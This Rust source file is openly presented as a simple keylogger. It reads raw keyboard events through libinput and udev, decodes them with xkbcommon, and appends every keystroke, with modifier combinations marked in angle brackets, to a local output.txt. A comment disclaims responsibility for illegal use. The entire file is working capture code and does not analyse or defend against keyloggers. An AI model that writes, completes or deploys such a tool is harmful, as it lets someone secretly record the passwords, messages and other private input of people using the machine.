// Simple keylogger that puts all keystrokes in an `output.txt` file.
// (I'm obviously not responsible for any illegal use of this)
extern crate input;
extern crate keylogger;
extern crate libc;
extern crate nix;
extern crate std;
extern crate udev;

use input::event::keyboard::KeyState;
use input::event::keyboard::KeyboardEvent::Key;
use input::event::keyboard::KeyboardEventTrait;
use input::Event::Keyboard;
use input::Libinput;
use keylogger::*;
use nix::poll;
use std::fs::File;
use std::io::Write;
use std::os::unix::io::AsRawFd;
use udev::Context;
use xkbcommon::xkb;
use xkbcommon::xkb::{keysym_get_name, keysym_to_utf8};

fn main() {
    // Libinput part - controls the hardware key receiving end
    let udev_context = Context::new().unwrap();
    let mut libinput_context = Libinput::new_from_udev(InputInterface {}, &udev_context);
    libinput_context.udev_assign_seat("seat0").unwrap();

    // Kbd part - controls the conversion between key presses and char shown
    let context = xkb::Context::new(xkb::CONTEXT_NO_FLAGS);
    let (layout, variant) = get_kbd_variant();
    let keymap = match xkb::Keymap::new_from_names(
        &context,
        "",
        "",
        &layout,
        &variant,
        None,
        xkb::KEYMAP_COMPILE_NO_FLAGS,
    ) {
        Some(keymap) => keymap,
        None => {
            println!("No valid keymap found; using default options.");
            xkb::Keymap::new_from_names(
                &context,
                "",
                "",
                "",
                "",
                None,
                xkb::KEYMAP_COMPILE_NO_FLAGS,
            )
            .unwrap()
        }
    };
    let mut state = xkb::State::new(&keymap);
    let mut modifiers_state = ModifiersState::new();

    let mut output_file = File::create("output.txt").unwrap();

    let pollfd = poll::PollFd::new(libinput_context.as_raw_fd(), poll::POLLIN);
    while poll::poll(&mut [pollfd], -1).is_ok() {
        libinput_context.dispatch().unwrap();
        let events = libinput_context.clone().filter_map(|event| match event {
            Keyboard(Key(key)) => Some(key),
            _ => None,
        });
        for event in events {
            let keycode = event.key();
            let key_state = event.key_state();

            // Don't display stuff twice
            let (direction, mut display) = match key_state {
                KeyState::Pressed => (xkb::KeyDirection::Down, true),
                KeyState::Released => (xkb::KeyDirection::Up, false),
            };

            state.update_key(keycode + 8, direction);

            let sym = state.key_get_one_sym(keycode + 8);

            // Don't display stuff if a modifier key has been pressed
            // We check modifiers state AND modifiers keys in case the person
            // has a custom ctrl / alt / logo layout
            display =
                display && !modifiers_state.update_with(&state) && !MODIFIERS_KEYS.contains(&sym);
            if !display {
                continue;
            }

            // "modified" stuff goes between <> brackets
            let mut modified = false;
            let str_to_write = if NON_PRINT_KEYS.contains(&sym) {
                modified = true;
                keysym_get_name(sym)
            } else {
                let mut var = keysym_to_utf8(sym).into_bytes();
                var.pop();
                String::from_utf8(var).unwrap()
            };
            
            let mut modifier_str = modifiers_state.get_modifiers_string();
            if modifier_str != "" {
                modified = true;
            }
            modifier_str.push_str(&str_to_write);
            if modified {
                modifier_str = format!("<{}>", modifier_str);
            }

            let bytes_to_write = modifier_str.into_bytes();
            output_file
                .write_all(&bytes_to_write)
                .expect("Failed to write to file");
        }
    }
}
